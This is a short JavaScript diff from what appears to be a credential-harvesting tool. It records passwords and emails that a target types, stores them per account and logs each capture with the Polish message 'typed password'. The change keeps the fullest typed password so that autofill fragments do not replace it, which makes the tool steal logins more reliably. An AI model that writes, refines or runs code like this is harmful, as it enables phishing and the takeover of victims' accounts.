@@ -200,8 +200,12 @@ async function launch(accountId, adminIp) {
       const current = await getAccount(accountId);
       if (!current) return;
       if (type === 'password' && value !== current.password) {
-        await saveAccount({ ...current, password: value });
-        pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${value}`);
+        // Only overwrite if new value is longer (prevents post-navigation
+        // autofill partial captures from replacing the full typed password).
+        if (!current.password || value.length >= current.password.length) {
+          await saveAccount({ ...current, password: value });
+          pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${value}`);
+        }
       } else if (type === 'email') {
         // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com" are
         // the same login so stop re-reporting after the first one.
